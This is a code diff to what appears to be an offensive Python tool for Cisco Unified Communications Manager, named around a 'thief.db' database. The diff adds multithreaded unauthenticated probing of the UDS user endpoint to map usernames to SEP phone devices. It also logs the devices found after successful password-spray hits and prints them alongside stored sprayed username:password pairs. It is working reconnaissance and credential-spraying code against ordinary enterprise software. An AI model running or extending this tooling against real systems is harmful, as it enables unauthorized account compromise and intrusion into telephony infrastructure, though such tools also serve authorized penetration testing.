@@ -674,6 +674,82 @@ def log_spray_attempt(cucm_host, username, password, status_code, error, db_file
             return
 
 
+def parse_uds_devices(xml_body):
+    """Extract SEP device names from a /cucm-uds/user/{id} XML response body."""
+    return re.findall(r'<device>(SEP[0-9A-Fa-f]{12})</device>', xml_body)
+
+
+def log_uds_device(cucm_host, username, device_name, source, db_file='thief.db'):
+    """Insert a (cucm_host, username, device_name) row into uds_devices; ignores duplicates."""
+    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+    try:
+        conn = sqlite3.connect(db_file, timeout=30.0)
+        conn.execute(
+            'INSERT OR IGNORE INTO uds_devices '
+            '(cucm_host, username, device_name, source, discovery_time) '
+            'VALUES (?, ?, ?, ?, ?)',
+            (cucm_host, username, device_name, source, timestamp),
+        )
+        conn.commit()
+        conn.close()
+    except Exception as e:
+        if globals().get('debug', False):
+            print(f'[!] log_uds_device error: {e}')
+
+
+def get_user_devices_unauthenticated(cucm_host, port=UDS_PORT, username='', timeout=10):
+    """
+    Probe /cucm-uds/user/{username} with no credentials.
+    Returns a list of SEP device names if the server responds 200, else [].
+    """
+    url = f'https://{cucm_host}:{port}/cucm-uds/user/{quote(username, safe="")}'
+    try:
+        resp = requests.get(url, verify=False, timeout=timeout)
+        if resp.status_code == 200:
+            return parse_uds_devices(resp.text)
+    except Exception:
+        pass
+    return []
+
+
+def enumerate_devices_unauthenticated(cucm_host, port, usernames, db_file, threads=10, _probe_fn=None):
+    """
+    Fan out unauthenticated device probes across all usernames in parallel.
+    Logs found SEP names to uds_devices with source='userenum'.
+    Returns the count of users for whom at least one device was found.
+    _probe_fn is injectable for testing.
+    """
+    if _probe_fn is None:
+        _probe_fn = get_user_devices_unauthenticated
+
+    found_count = 0
+    lock = threading.Lock()
+    work = queue.Queue()
+    for u in usernames:
+        work.put(u)
+
+    def worker():
+        nonlocal found_count
+        while True:
+            try:
+                username = work.get_nowait()
+            except queue.Empty:
+                return
+            devices = _probe_fn(cucm_host, port, username)
+            if devices:
+                with lock:
+                    found_count += 1
+                for device_name in devices:
+                    log_uds_device(cucm_host, username, device_name, 'userenum', db_file)
+
+    thread_list = [threading.Thread(target=worker, daemon=True) for _ in range(max(1, min(threads, len(usernames))))]
+    for t in thread_list:
+        t.start()
+    for t in thread_list:
+        t.join()
+    return found_count
+
+
 def is_user_rate_limited(username, db_file='thief.db', hours=1):
     """
     Return True iff `username` has any spray_attempts row within the last `hours`.
@@ -755,6 +831,7 @@ def _spray_worker(work_queue, results, password, cucm_host, port, db_file, dead_
         url = f'https://{cucm_host}:{port}/cucm-uds/user/{quote(username, safe="")}'
         status_code = None
         error = None
+        resp = None
         try:
             resp = requests.get(url, auth=(username, effective_password), verify=False, timeout=timeout)
             status_code = resp.status_code
@@ -766,6 +843,10 @@ def _spray_worker(work_queue, results, password, cucm_host, port, db_file, dead_
             error = f'{type(e).__name__}: {e}'
 
         log_spray_attempt(cucm_host, username, effective_password, status_code, error, db_file)
+
+        if status_code == 200 and resp is not None:
+            for device_name in parse_uds_devices(resp.text):
+                log_uds_device(cucm_host, username, device_name, 'spray_hit', db_file)
 
         with results['lock']:
             if status_code == 200:
@@ -1108,6 +1189,19 @@ def init_database(db_file='thief.db'):
     cursor.execute('''
         CREATE INDEX IF NOT EXISTS idx_spray_attempts_user_time
             ON spray_attempts(username, attempt_time)
+    ''')
+
+    # Create table for devices discovered via UDS (unauthenticated probe or spray hit)
+    cursor.execute('''
+        CREATE TABLE IF NOT EXISTS uds_devices (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            cucm_host TEXT NOT NULL,
+            username TEXT NOT NULL,
+            device_name TEXT NOT NULL,
+            source TEXT NOT NULL,
+            discovery_time TEXT NOT NULL,
+            UNIQUE(cucm_host, username, device_name)
+        )
     ''')
 
     conn.commit()
@@ -1483,19 +1577,42 @@ def display_database_summary(db_file='thief.db', cucm_filter=None):
             else:
                 raise
 
+        # Get UDS devices (unauthenticated enum or spray hit)
+        uds_devices = []
+        try:
+            if cucm_filter:
+                cursor.execute('''
+                    SELECT cucm_host, username, device_name, source, discovery_time
+                      FROM uds_devices
+                     WHERE cucm_host = ?
+                     ORDER BY username, device_name
+                ''', (cucm_filter,))
+            else:
+                cursor.execute('''
+                    SELECT cucm_host, username, device_name, source, discovery_time
+                      FROM uds_devices
+                     ORDER BY username, device_name
+                ''')
+            uds_devices = cursor.fetchall()
+        except sqlite3.OperationalError as e:
+            if 'no such table' in str(e):
+                uds_devices = []
+            else:
+                raise
+
         # Get download stats (handle missing table gracefully)
         total_attempts = 0
         successful_downloads = 0
         try:
             if cucm_filter:
                 cursor.execute('''
-                    SELECT COUNT(*), SUM(success) 
-                    FROM download_attempts 
+                    SELECT COUNT(*), SUM(success)
+                    FROM download_attempts
                     WHERE cucm_host = ?
                 ''', (cucm_filter,))
             else:
                 cursor.execute('''
-                    SELECT COUNT(*), SUM(success) 
+                    SELECT COUNT(*), SUM(success)
                     FROM download_attempts
                 ''')
             stats = cursor.fetchone()
@@ -1507,10 +1624,10 @@ def display_database_summary(db_file='thief.db', cucm_filter=None):
                 successful_downloads = 0
             else:
                 raise
-        
+
         conn.close()
         
-        if not credentials and not usernames and not mac_prefixes and not phone_cucm and not cluster_servers and not spray_hits:
+        if not credentials and not usernames and not mac_prefixes and not phone_cucm and not cluster_servers and not spray_hits and not uds_devices:
             print(f'\n[-] No data found in database')
             if cucm_filter:
                 print(f'[-] Filter: CUCM host = {cucm_filter}')
@@ -1617,6 +1734,14 @@ def display_database_summary(db_file='thief.db', cucm_filter=None):
             print('\n=== UDS Spray Hits ===')
             for host, user, pw, ts in spray_hits:
                 print(f'  [{ts}] {host}  {user} : {pw}')
+
+        if uds_devices:
+            print(f'\n\033[1m[+] UDS Devices ({len(uds_devices)} total)\033[0m')
+            print("-"*70)
+            print(f'{"Username":<24} {"Device":<20} {"Source":<12} {"CUCM Host"}')
+            print("-"*70)
+            for cucm_host_row, username, device_name, source, ts in uds_devices:
+                print(f'{username:<24} {device_name:<20} {source:<12} {cucm_host_row}')
 
         print(f'\n{"="*70}')
         print(f'\n\033[1mDATABASE STATISTICS:\033[0m')
@@ -1922,6 +2047,15 @@ def main():
             if debug:
                 for username in unique_users:
                     print(f'{username}')
+            if not no_db:
+                print(f'[*] Probing UDS for associated devices (unauthenticated)...')
+                found = enumerate_devices_unauthenticated(
+                    CUCM_host, args.uds_port, unique_users, db_file, threads=threads,
+                )
+                if found:
+                    print(f'[+] Found devices for {found} user(s) — see --show-db for details')
+                else:
+                    print(f'[-] No device associations returned unauthenticated')
         else:
             print('[-] No users returned from UDS API. Re-run with -d for request/response details.')
         quit(0)
